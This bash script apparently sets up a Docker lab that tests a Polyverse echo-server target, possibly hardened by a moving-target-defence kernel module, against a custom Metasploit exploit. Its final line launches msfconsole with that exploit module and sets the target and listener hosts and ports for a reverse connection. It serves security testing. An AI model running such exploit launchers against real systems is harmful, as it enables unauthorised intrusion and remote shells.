#!/bin/bash

declare -r loc=kali-metasploit
declare -r rem=readhook-node-echo-server
declare -r sha=e3c332cbbd205a1a7f0344102f5085a01e143d31 # readhook-node-echo-server from jitrop branch

# Get rid of any hangers-on
docker rm -f $loc $rem 2>/dev/null

# Make sure the kernel module is installed
docker run --rm -it --privileged 507760724064.dkr.ecr.us-west-2.amazonaws.com/mtd-module:175487-b03413 >/dev/null

# Start the remote target and get its IP address
docker run --privileged -dt --rm --name $rem -e PV_TWIDDLER_INITIAL_DELAY=3600000 polyverse/$rem:$sha
RHOST=$(docker exec -it $rem tail -n1 /etc/hosts | awk '{print $1}')

# Get the IP address of the attacker (that we will hopefully get again)
LHOST=$(docker run -it polyverse/$loc tail -n1 /etc/hosts | awk '{print $1}')

# Start metasploit and hope we get the same IP address.
docker run -it --rm --name $loc -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse/$loc msfconsole -x "use exploit/custom/readhook_node_echo_server.rb; set INTERACTIVE true; set RHOST $RHOST; set RPORT 8080; set LHOST $LHOST; set LPORT 5555"
